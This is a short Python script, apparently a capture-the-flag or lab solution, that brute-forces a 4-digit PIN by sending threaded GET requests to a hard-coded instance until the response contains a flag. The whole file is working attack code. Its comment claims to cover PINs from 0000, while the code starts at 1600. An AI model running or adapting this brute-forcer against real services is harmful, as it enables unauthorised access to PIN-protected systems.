import requests
import threading
from colorama import Fore, Style

ip = "94.237.57.211"  # Change this to your instance IP address
port = 38523       # Change this to your instance port number
cracked = False

# Try every possible 4-digit PIN (from 0000 to 9999)
def cracker(begin, end, color):
    global cracked

    for pin in range(begin, end):
        if cracked:
            break
        formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
        print(f"{color}Attempted PIN: {formatted_pin}{Style.RESET_ALL}")

        # Send the request to the server
        response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

        # Check if the server responds with success and the flag is found
        if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
            cracked = True
            print(f"\n{Fore.GREEN}{'-'*20}\nCorrect PIN found: {formatted_pin}{'-'*20}{Style.RESET_ALL}\n\n")
            print(f"Flag: {response.json()['flag']}")
            break

if __name__ == "__main__":
    threads = []
    colors = [Fore.MAGENTA, Fore.WHITE, Fore.YELLOW, Fore.BLUE]
    min = 1600
    max = 10000
    total = max - min
    portion_size = max//4
    for i in range(4):
        begin = min + (portion_size * i)
        end = min + (portion_size * (i + 1))
        t = threading.Thread(target=cracker, args=(begin, end, colors[i]))
        threads.append(t)
    for t in threads:
        t.start()
    for t in threads:
        t.join()
